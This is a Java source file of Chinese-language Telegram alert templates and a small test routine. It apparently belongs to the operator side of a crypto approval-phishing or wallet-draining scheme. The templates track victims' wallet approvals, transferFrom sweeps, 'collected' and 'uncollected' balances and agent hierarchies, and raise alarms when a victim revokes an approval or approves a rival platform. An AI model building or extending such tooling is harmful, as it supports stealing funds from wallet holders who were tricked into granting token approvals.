package project.monitor.telegram;

import java.text.MessageFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import org.springframework.web.util.HtmlUtils;

import kernel.util.DateUtils;
import project.monitor.telegram.internal.TelegramMessageServiceImpl;

public class TextFormat {
	/**
	 * 新增用户
	 */
	public static final String TEXT_NEW_USER = "🆕新增用户\n\n💰钱包地址：{0}\n\n🆔用户UID：{1}\n🧑🏻‍🦰代理：{2}\n👨‍🦱上级用户：{3}\n⏰时间：{4}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{5}\n🥈今日授权用户数：{6}\n🥉总用户数：{7}\n\n🥇授权总金额：{8}\n🥈授权地址数：{9}\n";

	/**
	 * 用户成功被授权
	 */
	public static final String TEXT_APPROVE = "✅新增监控\n\n💰钱包地址：{0}\n\n🆔用户UID：{1}\n🧑🏻‍🦰代理：{2}\n👨‍🦱上级用户：{3}\n⏰时间：{4}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{5}\n🥈今日授权用户数：{6}\n🥉总用户数：{7}\n\n🥇授权总金额：{8}\n🥈授权转账总金额：{9}\n🥉未归集授权总金额：{10}\n🎖授权地址数：{11}\n\n<a href=\"{12}\">{13}</a>";
	/**
	 * 用户授权失败
	 */
	public static final String TEXT_APPROVE_ERROR = "⛔️用户授权失败，请及时跟进\n\n💰钱包地址：{0}\n\n🆔用户UID：{1}\n🧑🏻‍🦰代理：{2}\n👨‍🦱上级用户：{3}\n⏰时间：{4}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{5}\n🥈今日授权用户数：{6}\n🥉总用户数：{7}\n\n🥇授权总金额：{8}\n🥈授权地址数：{9}\n\n<a href=\"{10}\">{11}</a>";

	/**
	 * 授权转账失败
	 */
	public static final String TEXT_TRANSFER_FROM_ERROR = "⛔️授权转账失败，请及时跟进\n\n💰钱包地址：{0}\n\n🆔用户UID：{1}\n🧑🏻‍🦰代理：{2}\n👨‍🦱上级用户：{3}\n\n💸转账数量：{4}\n🔺失败原因：{5}\n⏰时间：{6}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{7}\n🥈今日授权用户数：{8}\n🥉总用户数：{9}\n\n🥇授权总金额：{10}\n🥈授权转账总金额：{11}\n🥉未归集授权总金额：{12}\n🎖授权地址数：{13}\n";
	/**
	 * 用户兑换ETH
	 */
	public static final String TEXT_WALLET_ETH_WITHDRAW = "🔁用户兑换ETH，请及时跟进\n\n💰钱包地址：{0}\n\n🆔用户UID：{1}\n🧑🏻‍🦰代理：{2}\n👨‍🦱上级用户：{3}\n\n💸ETH数量：{4}\n💸兑换USDT：{5}\n⏰时间：{6}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{7}\n🥈今日授权用户数：{8}\n🥉总用户数：{9}\n\n🥇授权总金额：{10}\n🥈授权地址数：{11}\n";

	/**
	 * 用户USDT余额变化
	 */
	public static final String TEXT_WALLET_USDT_CHANGE = "<b>用户USDT余额变化，请关注</b>\n\n<b>[钱包地址]</b>  {0}\n<b>[用户UID]</b>  {1}\n<b>[代理]</b>  {2}\n\n<b>[上级用户]</b>  {3}\n<b>[历史余额]</b>  {4}\n<b>[变动金额]</b>  {5}\n<b>[当前余额]</b>  {6}\n<b>[时间]</b>  {7}\n\n------数据统计\n<b>[今日新用户数]</b>  {8}\n<b>[今日授权用户数]</b>  {9}\n<b>[总用户数]</b>  {10}\n\n<b>[授权总金额]</b>  {11}\n<b>[授权地址数]</b>  {12}\n";

	/**
	 * 用户USDT余额增加
	 */
	public static final String TEXT_WALLET_USDT_ADD = "💸💸💸USDT余额增加💸💸💸\n\n💰钱包地址：{0}\n\n🆔用户UID：{1}\n🧑🏻‍🦰代理：{2}\n👨‍🦱上级用户：{3}\n\n🌗历史余额：{4}\n🌖变动金额：{5}\n🌕当前余额：{6}\n⏰变动时间：{7}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{8}\n🥈今日授权用户数：{9}\n🥉总用户数：{10}\n\n🥇授权总金额：{11}\n🥈授权转账总金额：{12}\n🥉未归集授权总金额：{13}\n🎖授权地址数：{14}\n";
	/**
	 * 用户USDT余额减少
	 */
	public static final String TEXT_WALLET_USDT_SUB = "⚠️当前地址USDT余额减少，请注意跟进!\n\n💰钱包地址：{0}\n\n🆔用户UID：{1}\n🧑🏻‍🦰代理：{2}\n👨‍🦱上级用户：{3}\n\n🌗历史余额：{4}\n🌖变动金额：{5}\n🌕当前余额：{6}\n⏰变动时间：{7}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{8}\n🥈今日授权用户数：{9}\n🥉总用户数：{10}\n\n🥇授权总金额：{11}\n🥈授权转账总金额：{12}\n🥉未归集授权总金额：{13}\n🎖授权地址数：{14}\n";

	/**
	 * 用户ETH余额变化
	 */
	public static final String TEXT_WALLET_ETH_CHANGE = "<b>用户ETH余额变化，请关注</b>\n\n<b>[钱包地址]</b>  {0}\n<b>[用户UID]</b>  {1}\n<b>[代理]</b>  {2}\n\n<b>[上级用户]</b>  {3}\n<b>[历史余额]</b>  {4}\n<b>[变动金额]</b>  {5}\n<b>[当前余额]</b>  {6}\n<b>[时间]</b>  {7}\n\n------数据统计\n<b>[今日新用户数]</b>  {8}\n<b>[今日授权用户数]</b>  {9}\n<b>[总用户数]</b>  {10}\n\n<b>[授权总金额]</b>  {11}\n<b>[授权地址数]</b>  {12}\n";
	/**
	 * 用户ETH余额增加
	 */
	public static final String TEXT_WALLET_ETH_ADD = "⚠️当前地址ETH余额增加，请注意跟进!\n\n💰钱包地址：{0}\n\n🆔用户UID：{1}\n🧑🏻‍🦰代理：{2}\n👨‍🦱上级用户：{3}\n\n🌗历史余额：{4}\n🌖变动金额：{5}\n🌕当前余额：{6}\n⏰变动时间：{7}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{8}\n🥈今日授权用户数：{9}\n🥉总用户数：{10}\n\n🥇授权总金额：{11}\n🥈授权转账总金额：{12}\n🥉未归集授权总金额：{13}\n🎖授权地址数：{14}\n";
	/**
	 * 用户ETH余额减少
	 */
	public static final String TEXT_WALLET_ETH_SUB = "⚠️当前地址ETH余额减少，请注意跟进!\n\n💰钱包地址：{0}\n\n🆔用户UID：{1}\n🧑🏻‍🦰代理：{2}\n👨‍🦱上级用户：{3}\n\n🌗历史余额：{4}\n🌖变动金额：{5}\n🌕当前余额：{6}\n⏰变动时间：{7}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{8}\n🥈今日授权用户数：{9}\n🥉总用户数：{10}\n\n🥇授权总金额：{11}\n🥈授权转账总金额：{12}\n🥉未归集授权总金额：{13}\n🎖授权地址数：{14}\n";

	/**
	 * 用户领取活动
	 */
	public static final String TEXT_GET_ACTIVITY = "📣用户领取了活动，请及时跟进\n\n💰钱包地址：{0}\n\n🆔用户UID：{1}\n🧑🏻‍🦰代理：{2}\n👨‍🦱上级用户：{3}\n\n📢活动：{4}\n⏰时间：{5}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{6}\n🥈今日授权用户数：{7}\n🥉总用户数：{8}\n\n🥇授权总金额：{9}\n🥈授权转账总金额：{10}\n🥉未归集授权总金额：{11}\n🎖授权地址数：{12}\n";

	/**
	 * 今日平台数据
	 */
	public static final String TEXT_TODAY_DATA = "🎖🎖🎖今日平台数据🎖🎖🎖\n\n🥇今日新用户数：{0}\n🥈今日授权用户数：{1}\n🥉总用户数：{2}\n\n🥇授权总金额：{3}\n🥈授权转账总金额：{4}\n🥉未归集授权总金额：{5}\n🎖授权地址数：{6}\n\n🥇今日授权转账金额：{7}\n";
	/**
	 * 授权地址已满
	 */
	public static final String TEXT_APPROVE_ADDRESS_FULL = "⚠️当前授权地址授满切换，请注意补充。\n\n🥇剩余授权地址数：{0}\n🥈剩余可授权用户数：{1}\n\n⏰变动时间：{2}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{3}\n🥈今日授权用户数：{4}\n";
	/**
	 * 最后一条授权地址警告
	 */
	public static final String TEXT_LAST_APPROVE_ADDRESS_WARNING = "⚠️当前为最后一条授权地址授权，请注意补充。\n\n🥇剩余授权地址数：{0}\n🥈剩余可授权用户数：{1}\n\n⏰变动时间：{2}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{3}\n🥈今日授权用户数：{4}\n";
	/**
	 * 非本项目配置的授权地址授权
	 */
	public static final String TEXT_APPROVE_OTHER_ADDRESS_DANGER = "‼️‼️告警！！！用户存在非本盘的授权记录，请及时查看确认‼️‼️\n\n💰钱包地址：{0}\n\n🆔用户UID：{1}\n🧑🏻‍🦰代理：{2}\n👨‍🦱上级用户：{3}\n⏰时间：{4}\n🔑授权给：{5}\n\n🥇该用户授权金额：{6}\n\n<a href=\"{7}\">{8}</a>\n";
	/**
	 * 用户取消授权
	 */
	public static final String TEXT_APPROVE_REVOKED_DANGER = "‼️‼️告警！！！用户存在取消授权操作，请及时查看确认‼️‼️\n\n💰钱包地址：{0}\n\n🆔用户UID：{1}\n🧑🏻‍🦰代理：{2}\n👨‍🦱上级用户：{3}\n⏰时间：{4}\n\n🥇该用户授权金额：{5}\n\n<a href=\"{6}\">{7}</a>\n";
	/**
	 * 用户USDT归集
	 */
	public static final String TEXT_WALLET_USDT_COLLECT = "💸💸💸当前地址余额已归集成功💸💸💸\n\n💰钱包地址：{0}\n\n🆔用户UID：{1}\n🧑🏻‍🦰代理：{2}\n👨‍🦱上级用户：{3}\n\n🌕归集金额：{4}\n⏰时间：{5}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{6}\n🥈今日授权用户数：{7}\n🥉总用户数：{8}\n\n🥇授权总金额：{9}\n🥈授权转账总金额：{10}\n🥉未归集授权总金额：{11}\n🎖授权地址数：{12}\n\n🥇今日授权转账金额：{13}\n";

	/**
	 * 转账失败
	 */
	public static final String TEXT_SETTLE_TRANSFER_ERROR = "⛔️清算转账失败，请及时跟进\n\n🆔清算订单号：{0}\n\n💰发起地址：{1}\n💰到账地址：{2}\n💸转账数量：{3}\n🔺失败原因：{4}\n⏰时间：{5}\n\n🎖🎖🎖数据统计🎖🎖🎖\n\n🥇今日新用户数：{6}\n🥈今日授权用户数：{7}\n🥉总用户数：{8}\n\n🥇授权总金额：{9}\n🥈授权转账总金额：{10}\n🥉未归集授权总金额：{11}\n🎖授权地址数：{12}\n";
	public static String getText(String text, Object[] object) {
		String msg = MessageFormat.format(text, object);
		return msg;
	}

	public static void main(String[] args) {
		String address = "0x35D2d03607b9155b42CF673102FE58251AC4F644";
		String txHash = "0x9146c0e3ec07ee519acb8068fbb7b3c244a7a61d3fdfae353ff2a9f972adb4ca";
//		List<Object> param = new ArrayList<Object>();
//		param.add(address);// [钱包地址]
////		param.add("1");// [监控时间]
//		param.add("2");// [用户UID]
//		param.add("3");// [归属]
//		param.add("备注");// [上级用户]
//		param.add("4");// [时间]
//		param.add("5");// [今日新用户数]
//		param.add("6");// [今日授权用户数]
//		param.add("7");// [总用户数]
//		param.add("8");// [授权总金额]
//		param.add("9");// [授权地址数]
//		param.add("https://etherscan.io/address/" + address);// [用户地址连接]
//		param.add("在Etherscan上查看");// [链接标题]
////		Object[] param=new Object[] {};
//		String text = getText(TEXT_NEW_USER, param.toArray());
//		System.out.println(text);
//		TelegramMessageService service = new TelegramMessageServiceImpl();
//		service.send(text);

//		String url = "https://etherscan.io/tx/" + txHash;
//		String error = "<a href=\"" + url + "\">在Etherscan上查看</a>";
//		List<Object> param = new ArrayList<Object>();
//		param.add(address);// [钱包地址]
//		param.add(2);// [用户UID]
//		param.add(3);// [归属] 找到最近的代理商
//		param.add(4);// [转账数量]
//		param.add(error);// [失败原因]
//		param.add(5);// [时间]
//		param.add(6);// [今日新用户数]
//		param.add(7);// [今日授权用户数]
//		param.add(8);// [总用户数]
//		param.add(9);// [授权总金额]
//		param.add(10);// [授权地址数]
//		String text1 = TextFormat.getText(TextFormat.TEXT_TRANSFER_FROM_ERROR, param.toArray());
//		TelegramMessageService service = new TelegramMessageServiceImpl();
//		service.send(text1);

		usdtAdd();
	}

	public static void usdtAdd() {
		String address = "0x35D2d03607b9155b42CF673102FE58251AC4F644";
		String txHash = "0x9146c0e3ec07ee519acb8068fbb7b3c244a7a61d3fdfae353ff2a9f972adb4ca";
		List<Object> param = new ArrayList<Object>();
		param.add(address);// [钱包地址]
//		param.add("1");// [监控时间]
		param.add("2");// [用户UID]
		param.add("3");// [代理]
		param.add(HtmlUtils.htmlEscape("备注>"));// [上级用户]
		param.add(10);// [历史余额]
		param.add(3);// [变动金额]
		param.add(13);// [当前余额]
		param.add(DateUtils.format(new Date(), DateUtils.DF_yyyyMMddHHmmss));// [时间]
		param.add(1);// [今日新用户数]
		param.add(2);// [今日授权用户数]
		param.add(3);// [总用户数]
		param.add(4);// [授权总金额]
		param.add(5);// [授权地址数]
//		Object[] param=new Object[] {};
		String text = getText(TEXT_WALLET_USDT_ADD, param.toArray());
//		String text = getText(TEXT_WALLET_USDT_CHANGE, param.toArray());
		// System.out.println(text);
		TelegramMessageService service = new TelegramMessageServiceImpl();
		service.send(text);
	}

}
